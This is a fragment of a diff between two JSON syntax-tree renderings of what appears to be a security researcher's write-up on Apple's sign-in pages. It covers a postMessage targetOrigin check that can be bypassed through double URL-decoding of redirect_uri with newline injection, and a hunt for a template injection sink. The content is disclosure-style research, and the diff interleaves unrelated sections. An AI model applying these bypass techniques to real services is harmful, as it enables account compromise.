<               "column": 1,
<               "offset": 48957
16656,16659c20449,20487
<             "end": {
<               "line": 1006,
<               "column": 121,
<               "offset": 49077
---
>             {
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "this.attr(\"testIdpButtonText\", d()(w.a, \"envConfigFromConsumer.testIdpButtonText\", \"Test\"))\n\nd()(w.a, \"envConfigFromConsumer.accountName\", \"\").trim() ? (n.attr(\"accountName\", w.a.envConfigFromConsumer.accountName.trim()),\n\nn.attr(\"showCreateLink\", d()(w.a, \"envConfigFromConsumer.features.createLink\", !0)),\n\nn.attr(\"showiForgotLink\", d()(w.a, \"envConfigFromConsumer.features.iForgotLink\", !0)),\n\nn.attr(\"learnMoreLink\", d()(w.a, \"envConfigFromConsumer.learnMoreLink\", void 0)),\n\nn.attr(\"privacyText\", d()(w.a, \"envConfigFromConsumer.privacy\", void 0)),\n\nn.attr(\"showFooter\", d()(w.a, \"envConfigFromConsumer.features.footer\", !1)),\n\nn.attr(\"showRememberMe\") && (\"remember-me\" === d()(w.a, \"envConfigFromConsumer.rememberMeLabel\", \"\").trim() ? n.attr(\"rememberMeText\", l.a.getString(\"rememberMe\")) : \"keep-me-signed-in\" === d()(w.a, \"envConfigFromConsumer.rememberMeLabel\", \"\").trim() && n.attr(\"rememberMeText\", l.a.getString(\"keepMeSignedIn\")),\n\nn.attr(\"isRememberMeChecked\", !!d()(w.a, \"envConfigFromConsumer.features.selectRememberMe\", !1) || !!d()(w.a, \"accountName\", \"\").trim())),\n\ni = d()(w.a, \"envConfigFromConsumer.verificationToken\", \"\"),",
>               "position": {
>                 "start": {
>                   "line": 1082,
>                   "column": 1,
>                   "offset": 56455
>                 },
>                 "end": {
>                   "line": 1102,
>                   "column": 4,
>                   "offset": 57640
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
16661,16668d20488
<             "indent": []
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
16674c20494
<                   "value": "Otherwise, if ",
---
>                   "value": "It's going to be super annoying to test every one of these. If we dig a bit deeper, we can observe that for many of these there are two ways to reference these configuration options. At configuration time, in the configuration we send we refer to many of these by different names than what they're use as later. For example, ",
16677,16679c20497,20499
<                       "line": 1007,
<                       "column": 5,
<                       "offset": 49083
---
>                       "line": 1104,
>                       "column": 1,
>                       "offset": 57644
16682,16684c20502,20504
<                       "line": 1007,
<                       "column": 19,
<                       "offset": 49097
---
>                       "line": 1104,
>                       "column": 326,
>                       "offset": 57969
16691c20511
<                   "value": "targetOrigin",
---
>                   "value": "rememberMeLabel",
16694,16696c20514,20516
<                       "line": 1007,
<                       "column": 19,
<                       "offset": 49097
---
>                       "line": 1104,
>                       "column": 326,
>                       "offset": 57969
16699,16701c20519,20521
<                       "line": 1007,
<                       "column": 33,
<                       "offset": 49111
---
>                       "line": 1104,
>                       "column": 343,
>                       "offset": 57986
16708c20528
<                   "value": " is not a single U+002A ASTERISK character (*), then:  ",
---
>                   "value": " actually becomes ",
16711,16713c20531,20533
<                       "line": 1007,
<                       "column": 33,
<                       "offset": 49111
---
>                       "line": 1104,
>                       "column": 343,
>                       "offset": 57986
16716,16718c20536,20538
<                       "line": 1007,
<                       "column": 88,
<                       "offset": 49166
---
>                       "line": 1104,
>                       "column": 361,
>                       "offset": 58004
16722,16728d20541
<                 }
<               ],
<               "position": {
<                 "start": {
<                   "line": 1007,
<                   "column": 5,
<                   "offset": 49083
16730,16743d20542
<                 "end": {
<                   "line": 1007,
<                   "column": 88,
<                   "offset": 49166
<                 },
<                 "indent": []
<               }
<             },
<             {
<               "type": "list",
<               "ordered": true,
<               "start": 1,
<               "spread": false,
<               "children": [
16745,16852c20544,20545
<                   "type": "listItem",
<                   "spread": false,
<                   "checked": null,
<                   "children": [
<                     {
<                       "type": "paragraph",
<                       "children": [
<                         {
<                           "type": "text",
<                           "value": "Let ",
<                           "position": {
<                             "start": {
<                               "line": 1008,
<                               "column": 8,
<                               "offset": 49175
<                             },
<                             "end": {
<                               "line": 1008,
<                               "column": 12,
<                               "offset": 49179
<                             },
<                             "indent": []
<                           }
<                         },
<                         {
<                           "type": "inlineCode",
<                           "value": "parsedURL",
<                           "position": {
<                             "start": {
<                               "line": 1008,
<                               "column": 12,
<                               "offset": 49179
<                             },
<                             "end": {
<                               "line": 1008,
<                               "column": 23,
<                               "offset": 49190
<                             },
<                             "indent": []
<                           }
<                         },
<                         {
<                           "type": "text",
<                           "value": " be the result of running the URL parser on ",
<                           "position": {
<                             "start": {
<                               "line": 1008,
<                               "column": 23,
<                               "offset": 49190
<                             },
<                             "end": {
<                               "line": 1008,
<                               "column": 67,
<                               "offset": 49234
<                             },
<                             "indent": []
<                           }
<                         },
<                         {
<                           "type": "inlineCode",
<                           "value": "targetOrigin",
<                           "position": {
<                             "start": {
<                               "line": 1008,
<                               "column": 67,
<                               "offset": 49234
<                             },
<                             "end": {
<                               "line": 1008,
<                               "column": 81,
<                               "offset": 49248
<                             },
<                             "indent": []
<                           }
<                         },
<                         {
<                           "type": "text",
<                           "value": ".  ",
<                           "position": {
<                             "start": {
<                               "line": 1008,
<                               "column": 81,
<                               "offset": 49248
<                             },
<                             "end": {
<                               "line": 1008,
<                               "column": 84,
<                               "offset": 49251
<                             },
<                             "indent": []
<                           }
<                         }
<                       ],
<                       "position": {
<                         "start": {
<                           "line": 1008,
<                           "column": 8,
<                           "offset": 49175
<                         },
<                         "end": {
<                           "line": 1008,
<                           "column": 84,
<                           "offset": 49251
<                         },
<                         "indent": []
<                       }
<                     }
<                   ],
---
>                   "type": "inlineCode",
>                   "value": "rememberMeText",
16855,16857c20548,20550
<                       "line": 1008,
<                       "column": 5,
<                       "offset": 49172
---
>                       "line": 1104,
>                       "column": 361,
>                       "offset": 58004
16860,16862c20553,20555
<                       "line": 1008,
<                       "column": 84,
<                       "offset": 49251
---
>                       "line": 1104,
>                       "column": 377,
>                       "offset": 58020
16868,16941c20561,20562
<                   "type": "listItem",
<                   "spread": false,
<                   "checked": null,
<                   "children": [
<                     {
<                       "type": "paragraph",
<                       "children": [
<                         {
<                           "type": "text",
<                           "value": "If ",
<                           "position": {
<                             "start": {
<                               "line": 1009,
<                               "column": 8,
<                               "offset": 49260
<                             },
<                             "end": {
<                               "line": 1009,
<                               "column": 11,
<                               "offset": 49263
<                             },
<                             "indent": []
<                           }
<                         },
<                         {
<                           "type": "inlineCode",
<                           "value": "parsedURL",
<                           "position": {
<                             "start": {
<                               "line": 1009,
<                               "column": 11,
<                               "offset": 49263
<                             },
<                             "end": {
<                               "line": 1009,
<                               "column": 22,
<                               "offset": 49274
<                             },
<                             "indent": []
<                           }
<                         },
<                         {
<                           "type": "text",
<                           "value": " is failure, then throw a \"SyntaxError\" DOMException.",
<                           "position": {
<                             "start": {
<                               "line": 1009,
<                               "column": 22,
<                               "offset": 49274
<                             },
<                             "end": {
<                               "line": 1009,
<                               "column": 75,
<                               "offset": 49327
<                             },
<                             "indent": []
<                           }
<                         }
<                       ],
<                       "position": {
<                         "start": {
<                           "line": 1009,
<                           "column": 8,
<                           "offset": 49260
<                         },
<                         "end": {
<                           "line": 1009,
<                           "column": 75,
<                           "offset": 49327
<                         },
<                         "indent": []
<                       }
<                     }
<                   ],
---
>                   "type": "text",
>                   "value": ". If we look for that, we can find the sink that puts it onto the page.",
16944,16946c20565,20567
<                       "line": 1009,
<                       "column": 5,
<                       "offset": 49257
---
>                       "line": 1104,
>                       "column": 377,
>                       "offset": 58020
16949,16951c20570,20572
<                       "line": 1009,
<                       "column": 75,
<                       "offset": 49327
---
>                       "line": 1104,
>                       "column": 448,
>                       "offset": 58091
16959,16961c20580,20582
<                   "line": 1008,
<                   "column": 5,
<                   "offset": 49172
---
>                   "line": 1104,
>                   "column": 1,
>                   "offset": 57644
16964,16966c20585,20587
<                   "line": 1009,
<                   "column": 75,
<                   "offset": 49327
---
>                   "line": 1104,
>                   "column": 448,
>                   "offset": 58091
16968,16970c20589
<                 "indent": [
<                   5
<                 ]
---
>                 "indent": []
16972,16983d20590
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1007,
<               "column": 1,
<               "offset": 49079
<             },
<             "end": {
<               "line": 1009,
<               "column": 75,
<               "offset": 49327
16985,16995d20591
<             "indent": [
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
17001c20597
<                   "value": "Set ",
---
>                   "value": "Oddly, if we do a regular search via the 'search' panel, the only hits we get are in ",
17004,17006c20600,20602
<                       "line": 1010,
<                       "column": 5,
<                       "offset": 49333
---
>                       "line": 1106,
>                       "column": 1,
>                       "offset": 58095
17009,17011c20605,20607
<                       "line": 1010,
<                       "column": 9,
<                       "offset": 49337
---
>                       "line": 1106,
>                       "column": 86,
>                       "offset": 58180
17018c20614
<                   "value": "targetOrigin",
---
>                   "value": "app.js",
17021,17023c20617,20619
<                       "line": 1010,
<                       "column": 9,
<                       "offset": 49337
---
>                       "line": 1106,
>                       "column": 86,
>                       "offset": 58180
17026,17028c20622,20624
<                       "line": 1010,
<                       "column": 23,
<                       "offset": 49351
---
>                       "line": 1106,
>                       "column": 94,
>                       "offset": 58188
17035c20631
<                   "value": " to parsedURL's origin.",
---
>                   "value": " which doesn't actually appear to perform the action of rendering these parameters onto the page. This probably means that these config options are rendered by some externally defined template.",
17038,17040c20634,20636
<                       "line": 1010,
<                       "column": 23,
<                       "offset": 49351
---
>                       "line": 1106,
>                       "column": 94,
>                       "offset": 58188
17043,17045c20639,20641
<                       "line": 1010,
<                       "column": 46,
<                       "offset": 49374
---
>                       "line": 1106,
>                       "column": 287,
>                       "offset": 58381
17053,17055c20649,20651
<                   "line": 1010,
<                   "column": 5,
<                   "offset": 49333
---
>                   "line": 1106,
>                   "column": 1,
>                   "offset": 58095
17058,17060c20654,20656
<                   "line": 1010,
<                   "column": 46,
<                   "offset": 49374
---
>                   "line": 1106,
>                   "column": 287,
>                   "offset": 58381
17064,17070d20659
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1010,
<               "column": 1,
<               "offset": 49329
17072,17110d20660
<             "end": {
<               "line": 1010,
<               "column": 46,
<               "offset": 49374
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1003,
<           "column": 1,
<           "offset": 48790
<         },
<         "end": {
<           "line": 1010,
<           "column": 46,
<           "offset": 49374
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "footnoteDefinition",
<       "identifier": "2",
<       "label": "2",
<       "children": [
<         {
<           "type": "paragraph",
<           "children": [
17112,17114c20662
<               "type": "link",
<               "title": null,
<               "url": "https://html.spec.whatwg.org/multipage/web-messaging.html#posting-messages",
---
>               "type": "paragraph",
17118c20666
<                   "value": "https://html.spec.whatwg.org/multipage/web-messaging.html#posting-messages",
---
>                   "value": "If we go to our 'Network' panel and do a search of all network requests for 'rememberMeText' we strike gold; the templates are defined in ",
17121,17123c20669,20671
<                       "line": 1012,
<                       "column": 7,
<                       "offset": 49384
---
>                       "line": 1108,
>                       "column": 1,
>                       "offset": 58385
17126,17128c20674,20676
<                       "line": 1012,
<                       "column": 81,
<                       "offset": 49458
---
>                       "line": 1108,
>                       "column": 139,
>                       "offset": 58523
17132,17380d20679
<                 }
<               ],
<               "position": {
<                 "start": {
<                   "line": 1012,
<                   "column": 7,
<                   "offset": 49384
<                 },
<                 "end": {
<                   "line": 1012,
<                   "column": 81,
<                   "offset": 49458
<                 },
<                 "indent": []
<               }
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1012,
<               "column": 7,
<               "offset": 49384
<             },
<             "end": {
<               "line": 1012,
<               "column": 81,
<               "offset": 49458
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1012,
<           "column": 1,
<           "offset": 49378
<         },
<         "end": {
<           "line": 1012,
<           "column": 81,
<           "offset": 49458
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "inlineCode",
<           "value": "targetOrigin",
<           "position": {
<             "start": {
<               "line": 1015,
<               "column": 1,
<               "offset": 49464
<             },
<             "end": {
<               "line": 1015,
<               "column": 15,
<               "offset": 49478
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is ",
<           "position": {
<             "start": {
<               "line": 1015,
<               "column": 15,
<               "offset": 49478
<             },
<             "end": {
<               "line": 1015,
<               "column": 19,
<               "offset": 49482
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
<             {
<               "type": "text",
<               "value": "not",
<               "position": {
<                 "start": {
<                   "line": 1015,
<                   "column": 20,
<                   "offset": 49483
<                 },
<                 "end": {
<                   "line": 1015,
<                   "column": 23,
<                   "offset": 49486
<                 },
<                 "indent": []
<               }
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1015,
<               "column": 19,
<               "offset": 49482
<             },
<             "end": {
<               "line": 1015,
<               "column": 24,
<               "offset": 49487
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " an origin!! ",
<           "position": {
<             "start": {
<               "line": 1015,
<               "column": 24,
<               "offset": 49487
<             },
<             "end": {
<               "line": 1015,
<               "column": 37,
<               "offset": 49500
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "targetOrigin",
<           "position": {
<             "start": {
<               "line": 1015,
<               "column": 37,
<               "offset": 49500
<             },
<             "end": {
<               "line": 1015,
<               "column": 51,
<               "offset": 49514
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is technically a URL, from which an origin is extracted. For us, this is especially useful.",
<           "position": {
<             "start": {
<               "line": 1015,
<               "column": 51,
<               "offset": 49514
<             },
<             "end": {
<               "line": 1015,
<               "column": 143,
<               "offset": 49606
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1015,
<           "column": 1,
<           "offset": 49464
<         },
<         "end": {
<           "line": 1015,
<           "column": 143,
<           "offset": 49606
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Since the real origin is extracted from the ",
<           "position": {
<             "start": {
<               "line": 1017,
<               "column": 1,
<               "offset": 49610
<             },
<             "end": {
<               "line": 1017,
<               "column": 45,
<               "offset": 49654
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "targetOrigin",
<           "position": {
<             "start": {
<               "line": 1017,
<               "column": 45,
<               "offset": 49654
<             },
<             "end": {
<               "line": 1017,
<               "column": 59,
<               "offset": 49668
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " which we provide, after running the URL parser if we provide a value which parses to ",
<           "position": {
<             "start": {
<               "line": 1017,
<               "column": 59,
<               "offset": 49668
<             },
<             "end": {
<               "line": 1017,
<               "column": 145,
<               "offset": 49754
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
<             {
<               "type": "text",
<               "value": "our",
<               "position": {
<                 "start": {
<                   "line": 1017,
<                   "column": 146,
<                   "offset": 49755
17382,17385c20681,20696
<                 "end": {
<                   "line": 1017,
<                   "column": 149,
<                   "offset": 49758
---
>                 {
>                   "type": "inlineCode",
>                   "value": "signin",
>                   "position": {
>                     "start": {
>                       "line": 1108,
>                       "column": 139,
>                       "offset": 58523
>                     },
>                     "end": {
>                       "line": 1108,
>                       "column": 147,
>                       "offset": 58531
>                     },
>                     "indent": []
>                   }
17387,17792c20698,20715
<                 "indent": []
<               }
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1017,
<               "column": 145,
<               "offset": 49754
<             },
<             "end": {
<               "line": 1017,
<               "column": 150,
<               "offset": 49759
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " origin instead of ",
<           "position": {
<             "start": {
<               "line": 1017,
<               "column": 150,
<               "offset": 49759
<             },
<             "end": {
<               "line": 1017,
<               "column": 169,
<               "offset": 49778
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "www.icloud.com",
<           "position": {
<             "start": {
<               "line": 1017,
<               "column": 169,
<               "offset": 49778
<             },
<             "end": {
<               "line": 1017,
<               "column": 185,
<               "offset": 49794
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " then we can bypass the intended origin check.",
<           "position": {
<             "start": {
<               "line": 1017,
<               "column": 185,
<               "offset": 49794
<             },
<             "end": {
<               "line": 1017,
<               "column": 231,
<               "offset": 49840
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1017,
<           "column": 1,
<           "offset": 49610
<         },
<         "end": {
<           "line": 1017,
<           "column": 231,
<           "offset": 49840
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Given that ",
<           "position": {
<             "start": {
<               "line": 1019,
<               "column": 1,
<               "offset": 49844
<             },
<             "end": {
<               "line": 1019,
<               "column": 12,
<               "offset": 49855
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "idmsa.apple.com",
<           "position": {
<             "start": {
<               "line": 1019,
<               "column": 12,
<               "offset": 49855
<             },
<             "end": {
<               "line": 1019,
<               "column": 29,
<               "offset": 49872
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " appears to perform an origin parse itself, it would be impossible to do this if not for one minor bug in the way that ",
<           "position": {
<             "start": {
<               "line": 1019,
<               "column": 29,
<               "offset": 49872
<             },
<             "end": {
<               "line": 1019,
<               "column": 148,
<               "offset": 49991
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "redirect_uri",
<           "position": {
<             "start": {
<               "line": 1019,
<               "column": 148,
<               "offset": 49991
<             },
<             "end": {
<               "line": 1019,
<               "column": 162,
<               "offset": 50005
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is passed to the page's javascript code.",
<           "position": {
<             "start": {
<               "line": 1019,
<               "column": 162,
<               "offset": 50005
<             },
<             "end": {
<               "line": 1019,
<               "column": 203,
<               "offset": 50046
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1019,
<           "column": 1,
<           "offset": 49844
<         },
<         "end": {
<           "line": 1019,
<           "column": 203,
<           "offset": 50046
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "You see, early on in my testing I noticed that if I added ",
<           "position": {
<             "start": {
<               "line": 1021,
<               "column": 1,
<               "offset": 50050
<             },
<             "end": {
<               "line": 1021,
<               "column": 59,
<               "offset": 50108
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "%0a",
<           "position": {
<             "start": {
<               "line": 1021,
<               "column": 59,
<               "offset": 50108
<             },
<             "end": {
<               "line": 1021,
<               "column": 64,
<               "offset": 50113
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", which is URL speak for 'new line' in my ",
<           "position": {
<             "start": {
<               "line": 1021,
<               "column": 64,
<               "offset": 50113
<             },
<             "end": {
<               "line": 1021,
<               "column": 106,
<               "offset": 50155
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "redirect_uri",
<           "position": {
<             "start": {
<               "line": 1021,
<               "column": 106,
<               "offset": 50155
<             },
<             "end": {
<               "line": 1021,
<               "column": 120,
<               "offset": 50169
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", the page would completely break! The reason for this is that the ",
<           "position": {
<             "start": {
<               "line": 1021,
<               "column": 120,
<               "offset": 50169
<             },
<             "end": {
<               "line": 1021,
<               "column": 187,
<               "offset": 50236
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "redirect_uri",
<           "position": {
<             "start": {
<               "line": 1021,
<               "column": 187,
<               "offset": 50236
<             },
<             "end": {
<               "line": 1021,
<               "column": 201,
<               "offset": 50250
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is passed to the Javascript code by generating Javascript code into the page, like this:",
<           "position": {
<             "start": {
<               "line": 1021,
<               "column": 201,
<               "offset": 50250
<             },
<             "end": {
<               "line": 1021,
<               "column": 290,
<               "offset": 50339
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1021,
<           "column": 1,
<           "offset": 50050
<         },
<         "end": {
<           "line": 1021,
<           "column": 290,
<           "offset": 50339
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "bootData.destinationDomain = decodeURIComponent('https://www.icloud.com');  ",
<       "position": {
<         "start": {
<           "line": 1023,
<           "column": 1,
<           "offset": 50343
<         },
<         "end": {
<           "line": 1025,
<           "column": 4,
<           "offset": 50439
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Note that the parameter passed to ",
<           "position": {
<             "start": {
<               "line": 1026,
<               "column": 1,
<               "offset": 50441
<             },
<             "end": {
<               "line": 1026,
<               "column": 35,
<               "offset": 50475
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "decodeURIComponent",
<           "position": {
<             "start": {
<               "line": 1026,
<               "column": 35,
<               "offset": 50475
<             },
<             "end": {
<               "line": 1026,
<               "column": 55,
<               "offset": 50495
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", which URL decodes the given string is ",
<           "position": {
<             "start": {
<               "line": 1026,
<               "column": 55,
<               "offset": 50495
<             },
<             "end": {
<               "line": 1026,
<               "column": 95,
<               "offset": 50535
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
<             {
<               "type": "text",
<               "value": "already",
---
>                 {
>                   "type": "text",
>                   "value": " (the HTML page) itself.",
>                   "position": {
>                     "start": {
>                       "line": 1108,
>                       "column": 147,
>                       "offset": 58531
>                     },
>                     "end": {
>                       "line": 1108,
>                       "column": 171,
>                       "offset": 58555
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
17795,17797c20718,20720
<                   "line": 1026,
<                   "column": 96,
<                   "offset": 50536
---
>                   "line": 1108,
>                   "column": 1,
>                   "offset": 58385
17800,17802c20723,20725
<                   "line": 1026,
<                   "column": 103,
<                   "offset": 50543
---
>                   "line": 1108,
>                   "column": 171,
>                   "offset": 58555
17806,18063d20728
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1026,
<               "column": 95,
<               "offset": 50535
<             },
<             "end": {
<               "line": 1026,
<               "column": 104,
<               "offset": 50544
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " URL decoded. So when ",
<           "position": {
<             "start": {
<               "line": 1026,
<               "column": 104,
<               "offset": 50544
<             },
<             "end": {
<               "line": 1026,
<               "column": 126,
<               "offset": 50566
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "%0A",
<           "position": {
<             "start": {
<               "line": 1026,
<               "column": 126,
<               "offset": 50566
<             },
<             "end": {
<               "line": 1026,
<               "column": 131,
<               "offset": 50571
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is present in the URL, the following Javascript gets generated:",
<           "position": {
<             "start": {
<               "line": 1026,
<               "column": 131,
<               "offset": 50571
<             },
<             "end": {
<               "line": 1026,
<               "column": 195,
<               "offset": 50635
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1026,
<           "column": 1,
<           "offset": 50441
<         },
<         "end": {
<           "line": 1026,
<           "column": 195,
<           "offset": 50635
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "       bootData.destinationDomain = decodeURIComponent('https://\n;@www.icloud.com');  ",
<       "position": {
<         "start": {
<           "line": 1028,
<           "column": 1,
<           "offset": 50639
<         },
<         "end": {
<           "line": 1031,
<           "column": 4,
<           "offset": 50746
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Now, Javascript strings that extend to two lines are invalid, and completely prevent the Javascript parser from continuing which breaks the page. Normally, you'd be able to get XSS with an issue like that but despite my best efforts I was unable to because I couldn't produce the ",
<           "position": {
<             "start": {
<               "line": 1033,
<               "column": 1,
<               "offset": 50750
<             },
<             "end": {
<               "line": 1033,
<               "column": 281,
<               "offset": 51030
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "'",
<           "position": {
<             "start": {
<               "line": 1033,
<               "column": 281,
<               "offset": 51030
<             },
<             "end": {
<               "line": 1033,
<               "column": 284,
<               "offset": 51033
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " that would be needed to escape the string.",
<           "position": {
<             "start": {
<               "line": 1033,
<               "column": 284,
<               "offset": 51033
<             },
<             "end": {
<               "line": 1033,
<               "column": 327,
<               "offset": 51076
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1033,
<           "column": 1,
<           "offset": 50750
<         },
<         "end": {
<           "line": 1033,
<           "column": 327,
<           "offset": 51076
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "It seems at some point in the past, the ",
<           "position": {
<             "start": {
<               "line": 1035,
<               "column": 1,
<               "offset": 51080
<             },
<             "end": {
<               "line": 1035,
<               "column": 41,
<               "offset": 51120
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "redirect_uri",
<           "position": {
<             "start": {
<               "line": 1035,
<               "column": 41,
<               "offset": 51120
<             },
<             "end": {
<               "line": 1035,
<               "column": 55,
<               "offset": 51134
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " was entering this part of the code URL encoded. But it is no longer, and we can use this to our advantage. This fact means that ",
<           "position": {
<             "start": {
<               "line": 1035,
<               "column": 55,
<               "offset": 51134
<             },
<             "end": {
<               "line": 1035,
<               "column": 184,
<               "offset": 51263
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "bootData.destinationDomain",
<           "position": {
<             "start": {
<               "line": 1035,
<               "column": 184,
<               "offset": 51263
<             },
<             "end": {
<               "line": 1035,
<               "column": 212,
<               "offset": 51291
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", which specifies the valid embedding domain actually gets ",
<           "position": {
<             "start": {
<               "line": 1035,
<               "column": 212,
<               "offset": 51291
<             },
<             "end": {
<               "line": 1035,
<               "column": 271,
<               "offset": 51350
18065,18070d20729
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
18072,18073c20731,20734
<               "type": "text",
<               "value": "doubly",
---
>               "type": "code",
>               "lang": "HTML",
>               "meta": null,
>               "value": "{{#if showRememberMe}}\n<div class=\"si-remember-password\">\n    <input type=\"checkbox\" id=\"remember-me\" class=\"form-choice form-choice-checkbox\" {($checked)}=\"isRememberMeChecked\">\n    <label id=\"remember-me-label\" class=\"form-label\" for=\"remember-me\">\n    <span class=\"form-choice-indicator\"></span>\n    {{rememberMeText}}\n    </label>\n</div>\n{{/if}}",
18076,18078c20737,20739
<                   "line": 1035,
<                   "column": 272,
<                   "offset": 51351
---
>                   "line": 1110,
>                   "column": 1,
>                   "offset": 58559
18081,18083c20742,20744
<                   "line": 1035,
<                   "column": 278,
<                   "offset": 51357
---
>                   "line": 1120,
>                   "column": 4,
>                   "offset": 58930
18085c20746,20757
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
18087,18253d20758
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1035,
<               "column": 271,
<               "offset": 51350
<             },
<             "end": {
<               "line": 1035,
<               "column": 279,
<               "offset": 51358
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " URL decoded.",
<           "position": {
<             "start": {
<               "line": 1035,
<               "column": 279,
<               "offset": 51358
<             },
<             "end": {
<               "line": 1035,
<               "column": 292,
<               "offset": 51371
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1035,
<           "column": 1,
<           "offset": 51080
<         },
<         "end": {
<           "line": 1035,
<           "column": 292,
<           "offset": 51371
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "I iterated over some possible options for this, and with much trial and tribulation worked out the best ",
<           "position": {
<             "start": {
<               "line": 1037,
<               "column": 1,
<               "offset": 51375
<             },
<             "end": {
<               "line": 1037,
<               "column": 105,
<               "offset": 51479
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "redirect_uri",
<           "position": {
<             "start": {
<               "line": 1037,
<               "column": 105,
<               "offset": 51479
<             },
<             "end": {
<               "line": 1037,
<               "column": 119,
<               "offset": 51493
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " was ",
<           "position": {
<             "start": {
<               "line": 1037,
<               "column": 119,
<               "offset": 51493
<             },
<             "end": {
<               "line": 1037,
